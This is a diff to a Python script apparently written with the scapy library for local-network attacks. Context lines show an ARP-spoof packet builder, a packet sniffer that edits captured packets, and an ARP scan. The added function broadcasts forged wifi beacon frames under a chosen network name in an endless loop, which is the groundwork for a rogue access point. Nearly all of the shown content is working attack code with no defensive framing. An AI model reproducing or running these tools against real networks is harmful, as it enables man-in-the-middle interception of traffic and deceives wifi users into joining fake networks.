@@ -52,12 +52,32 @@ def sniffing(src, dst):
     # sniff(prn=editPkg, filter="src " + src)
     sniff(prn=editPkg)
 
-# if __name__=='__main__':
-    # sniffing("1.1.1.1", "0.0.0.0")
+
 def craft_arp_spoof(target_ip, gateway_ip):
     return ARP(op = 2, psrc = gateway_ip, pdst = target_ip)
+
+# Create a fake wifi router, (need monitor mode on netif)
+def fake_wifi_router(interface, name):
+    # interface to use to send beacon frames, must be in monitor mode
+    iface = interface 
+    # generate a random MAC address (built-in in scapy)
+    sender_mac = RandMAC()
+    # SSID (name of access point)
+    ssid = name
+    # 802.11 frame
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
+    # beacon layer
+    beacon = Dot11Beacon()
+    # putting ssid in the frame
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    # stack all the layers and add a RadioTap
+    frame = RadioTap()/dot11/beacon/essid
+    # send the frame in layer 2 every 100 milliseconds forever
+    # using the `iface` interface
+    sendp(frame, inter=0.1, iface=iface, loop=1)
+
 
 if __name__=='__main__':
     # arp_scan('192.168.2.0/24')
     arp_scan()
-    arp_spoof("aaa")
+    # sniffing("1.1.1.1", "0.0.0.0")
